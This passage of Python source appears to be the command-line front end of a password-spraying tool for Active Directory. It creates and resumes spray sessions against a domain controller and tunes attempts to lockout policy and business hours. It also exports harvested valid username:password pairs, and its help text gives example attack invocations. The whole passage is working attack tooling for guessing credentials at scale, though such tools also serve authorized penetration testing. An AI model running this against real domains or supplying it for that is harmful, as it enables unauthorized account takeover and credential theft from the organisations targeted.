        session = create_session(
            dc_host=args.dc,
            workgroup=args.workgroup,
            users=users,
            passwords=passwords,
            policy=policy,
            schedule=schedule,
            user_as_pass=args.userpass or False,
            use_ssl=args.ssl or False,
            port=args.port,
            output_file=args.output or 'valid_creds.txt',
            verbose=args.verbose or 3,
        )
        session.save(session_path)
        print(f"{Colors.GREEN}[+] Created session: {session.config.session_id}{Colors.NC}", file=sys.stderr)

    # Set up time verification
    force_system_time = getattr(args, 'force_system_time', False)
    time_verifier = TimeVerifier(
        force_system_time=force_system_time,
        verbose=session.config.verbose
    )

    # Verify time if schedule is enabled
    if session.schedule.is_enabled():
        print(f"{Colors.BLUE}[+] Verifying time from external sources...{Colors.NC}", file=sys.stderr)
        try:
            result = time_verifier.verify()
            print(f"{Colors.GREEN}[+] Time verified from: {result.source}{Colors.NC}", file=sys.stderr)
            
            if force_system_time:
                print(f"{Colors.ORANGE}[!] WARNING: Using system clock (--force-system-time){Colors.NC}", file=sys.stderr)
                print(f"{Colors.ORANGE}[!] Please ensure your system clock is accurate!{Colors.NC}", file=sys.stderr)
                print(f"{Colors.ORANGE}[!] Incorrect time may cause spraying during business hours.{Colors.NC}", file=sys.stderr)
            elif not result.drift_acceptable:
                print(f"{Colors.ORANGE}[!] WARNING: System clock drift detected: {result.offset_seconds:.1f} seconds{Colors.NC}", file=sys.stderr)
                print(f"{Colors.ORANGE}[!] System time: {result.system_time.strftime('%Y-%m-%d %H:%M:%S')} UTC{Colors.NC}", file=sys.stderr)
                print(f"{Colors.ORANGE}[!] Verified time: {result.verified_time.strftime('%Y-%m-%d %H:%M:%S')} UTC{Colors.NC}", file=sys.stderr)
                print(f"{Colors.GREEN}[+] Using verified external time for scheduling.{Colors.NC}", file=sys.stderr)
            else:
                print(f"{Colors.GREEN}[+] System clock is accurate (drift: {result.offset_seconds:.1f}s){Colors.NC}", file=sys.stderr)
                
        except TimeVerificationError as e:
            print(f"{Colors.RED}[!] {e}{Colors.NC}", file=sys.stderr)
            return 1
    else:
        # No schedule, but still set up time verifier (will use system time)
        time_verifier = TimeVerifier(force_system_time=True, verbose=session.config.verbose)

    # Run the spray
    engine = SprayEngine(
        session, 
        session_path, 
        verbose=session.config.verbose,
        time_verifier=time_verifier
    )
    success = engine.run()

    return 0 if success else 1


def cmd_sessions(args) -> int:
    """List all sessions."""
    session_path = Path(args.session_path)
    sessions = list_sessions(session_path)

    if not sessions:
        print(f"{Colors.ORANGE}[!] No sessions found.{Colors.NC}", file=sys.stderr)
        return 0

    # Header
    print(f"{Colors.BLUE}{'─' * 100}{Colors.NC}")
    print(
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Done':^4}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Session':^32}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Workgroup':^12}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'DC Host':^15}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Valid':^6}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC} {Colors.ORANGE}{'Created':^16}{Colors.NC} "
        f"{Colors.BLUE}│{Colors.NC}"
    )
    print(f"{Colors.BLUE}{'─' * 100}{Colors.NC}")

    for s in sessions:
        done_str = f"{Colors.GREEN}Yes{Colors.NC}" if s["completed"] else f"{Colors.RED}No{Colors.NC}"
        created = s["created_at"][:16].replace("T", " ")
        print(
            f"{Colors.BLUE}│{Colors.NC} {done_str:^13} "
            f"{Colors.BLUE}│{Colors.NC} {s['session_id']:^32} "
            f"{Colors.BLUE}│{Colors.NC} {s['workgroup']:^12} "
            f"{Colors.BLUE}│{Colors.NC} {s['dc_host']:^15} "
            f"{Colors.BLUE}│{Colors.NC} {s['valid']:^6} "
            f"{Colors.BLUE}│{Colors.NC} {created:^16} "
            f"{Colors.BLUE}│{Colors.NC}"
        )

    print(f"{Colors.BLUE}{'─' * 100}{Colors.NC}")
    return 0


def cmd_delete(args) -> int:
    """Delete a session."""
    session_path = Path(args.session_path) / args.session_id
    if not session_path.exists():
        print(f"{Colors.RED}[!] Session not found: {args.session_id}{Colors.NC}", file=sys.stderr)
        return 1

    shutil.rmtree(session_path)
    print(f"{Colors.GREEN}[+] Deleted session: {args.session_id}{Colors.NC}", file=sys.stderr)
    return 0


def cmd_export(args) -> int:
    """Export session results."""
    session_path = Path(args.session_path)
    try:
        session = SpraySession.load(session_path, args.session_id)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Session not found: {args.session_id}{Colors.NC}", file=sys.stderr)
        return 1

    if args.format == "json":
        print(json.dumps(session.to_dict(), indent=2))
    else:  # credentials format
        for attempt in session.attempts:
            if attempt.status in VALID_CREDENTIAL_STATUSES:
                suffix = "" if attempt.status == ERROR_SUCCESS else f" # {attempt.status.replace('ERROR_', '')}"
                print(f"{attempt.username}:{attempt.password}{suffix}")

    return 0


def cmd_generate_config(args) -> int:
    """Generate a template configuration file."""
    output = generate_config_file(args.output)
    if args.output:
        print(f"{Colors.GREEN}[+] {output}{Colors.NC}", file=sys.stderr)
    else:
        print(output)
    return 0


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="Password spraying tool for Active Directory.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    subparsers = parser.add_subparsers(dest="command", help="Command to run")

    # Spray subcommand
    spray_parser = subparsers.add_parser(
        "spray",
        help="Execute a password spray",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # With config file
  %(prog)s --config spray.ini

  # With AD creds (auto-enumerate users and fetch policy)
  %(prog)s -d 10.0.0.1 -w CORP -u admin -p 'P@ss' --passwords passwords.txt

  # With AD creds + users file (fetch policy only)
  %(prog)s -d dc01.local -w CORP -u admin -p 'P@ss' --passwords pwds.txt --users users.txt

  # Without AD creds (manual policy, requires --users)
  %(prog)s -d 10.0.0.1 -w CORP --users users.txt --passwords pwds.txt

  # Without AD creds, custom policy
  %(prog)s -d 10.0.0.1 -w CORP --users users.txt --passwords pwds.txt \\
      --lockout-threshold 3 --lockout-window 15 --min-length 10 --complexity

  # Resume existing spray
  %(prog)s --resume 305578a5af638c2b377b41b43e693291

  # Use 'auto' for users and policy (requires AD creds)
  %(prog)s --config spray.ini  # with users_file=auto, lockout_threshold=auto, etc.
        """,
    )
    spray_parser.add_argument("-c", "--config", help="Configuration file (INI format)")
    spray_parser.add_argument("-d", "--dc", help="Domain controller FQDN or IP address")
    spray_parser.add_argument("-w", "--workgroup", help="NetBIOS domain/workgroup name (e.g., CORP)")
    spray_parser.add_argument("-u", "--username", help="Username for AD enumeration (required for 'auto' settings)")
    spray_parser.add_argument("-p", "--password", help="Password for AD enumeration (required for 'auto' settings)")
    spray_parser.add_argument("--base-dn", dest="base_dn", help="Override LDAP base DN")
    spray_parser.add_argument("--passwords", dest="spray_passwords", help="File containing passwords to spray")
    spray_parser.add_argument("--users", dest="users_file", help="File containing users, or 'auto' to enumerate from AD")
    spray_parser.add_argument("-o", "--output", help="Output file for valid credentials (default: valid_creds.txt)")
    spray_parser.add_argument("-v", "--verbose", type=int, choices=[0, 1, 2, 3],
                              help="Verbosity level (0=silent, 3=max, default: 3)")
    spray_parser.add_argument("--userpass", action="store_true", help="Try username as password")
    spray_parser.add_argument("--ssl", action="store_true", help="Use LDAPS (SSL/TLS)")
    spray_parser.add_argument("--port", type=int, help="Override port number")
    spray_parser.add_argument("--resume", metavar="SESSION_ID", help="Resume an existing session")
    spray_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                              help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
    # Policy override flags (used when no AD creds available, or 'auto' for AD lookup)
    spray_parser.add_argument("--lockout-threshold", 
                              help="Lockout threshold (integer or 'auto' for AD lookup)")
    spray_parser.add_argument("--lockout-window",
                              help="Lockout observation window in minutes (integer or 'auto')")
    spray_parser.add_argument("--min-length",
                              help="Minimum password length (integer or 'auto')")
    spray_parser.add_argument("--complexity",
                              help="Password complexity ('true', 'false', or 'auto')")
    # Schedule options
    spray_parser.add_argument("--timezone", help="Timezone for business hours (IANA format, e.g., America/New_York)")
    spray_parser.add_argument("--business-hours-reduction", type=int,
                              help="Attempt reduction during business hours (default: 3)")
    spray_parser.add_argument("--force-system-time", action="store_true",
                              help="Use system clock instead of external time verification (not recommended)")
    spray_parser.set_defaults(func=cmd_spray)

    # Sessions subcommand
    sessions_parser = subparsers.add_parser("sessions", help="List all sessions")
    sessions_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                                 help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
    sessions_parser.set_defaults(func=cmd_sessions)

    # Delete subcommand
    delete_parser = subparsers.add_parser("delete", help="Delete a session")
    delete_parser.add_argument("session_id", help="Session ID to delete")
    delete_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                               help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
    delete_parser.set_defaults(func=cmd_delete)

    # Export subcommand
    export_parser = subparsers.add_parser("export", help="Export session results")
    export_parser.add_argument("session_id", help="Session ID to export")
    export_parser.add_argument("-f", "--format", choices=["json", "creds"], default="creds",
                               help="Export format (default: creds)")
    export_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                               help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
    export_parser.set_defaults(func=cmd_export)

    # Generate-config subcommand
    genconfig_parser = subparsers.add_parser("generate-config", help="Generate a template configuration file")
    genconfig_parser.add_argument("-o", "--output", help="Output file path (prints to stdout if not specified)")
    genconfig_parser.set_defaults(func=cmd_generate_config)

    args = parser.parse_args()

    # Disable colors if not a TTY
    if not sys.stderr.isatty():
        Colors.disable()

    # Handle policy args that can be 'auto' or int
    if hasattr(args, 'lockout_threshold') and args.lockout_threshold is not None:
        if args.lockout_threshold != 'auto':
            try:
                args.lockout_threshold = int(args.lockout_threshold)
            except ValueError:
                print(f"{Colors.RED}[!] Invalid lockout-threshold: {args.lockout_threshold}{Colors.NC}", file=sys.stderr)
                return 1

    if hasattr(args, 'lockout_window') and args.lockout_window is not None:
        if args.lockout_window != 'auto':
            try:
                args.lockout_window = int(args.lockout_window)
            except ValueError:
                print(f"{Colors.RED}[!] Invalid lockout-window: {args.lockout_window}{Colors.NC}", file=sys.stderr)
                return 1

    if hasattr(args, 'min_length') and args.min_length is not None:
        if args.min_length != 'auto':
            try:
                args.min_length = int(args.min_length)
            except ValueError:
                print(f"{Colors.RED}[!] Invalid min-length: {args.min_length}{Colors.NC}", file=sys.stderr)
                return 1

    if hasattr(args, 'complexity') and args.complexity is not None:
        if args.complexity == 'auto':
            pass
        elif args.complexity.lower() in ('true', '1', 'yes'):
            args.complexity = True
        elif args.complexity.lower() in ('false', '0', 'no'):
            args.complexity = False
        else:
            print(f"{Colors.RED}[!] Invalid complexity: {args.complexity}{Colors.NC}", file=sys.stderr)
            return 1

    if not args.command:
        parser.print_help()
        return 1

    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())